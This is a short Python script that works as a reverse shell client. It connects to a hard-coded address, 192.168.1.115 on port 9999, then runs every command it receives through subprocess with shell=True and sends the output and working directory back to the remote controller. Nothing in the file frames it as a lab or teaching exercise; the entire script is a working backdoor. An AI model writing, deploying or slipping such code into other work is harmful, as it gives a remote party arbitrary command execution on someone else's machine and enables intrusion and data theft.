import socket
import sys
import os
import subprocess

# constants
HOST = '192.168.1.115'
PORT = 9999


def start_client():
    global s
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        receive_commands()
    except socket.error as err:
        print('Socket creation failed :' + str(err) + '\n' + "retrying...")


def receive_commands():
    global s
    while True:
        data_bytes = s.recv(1024)
        data_str = data_bytes.decode("utf-8")
        if data_str[:2] == 'cd':
            os.chdir(data_str[3:])
        elif len(data_str) > 0:
            if(data_str[:] == 'quit'):
                break
            cmd = subprocess.Popen(
                data_str[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '>'))
            print(output_str)

    s.close()


def main():
    start_client()


main()
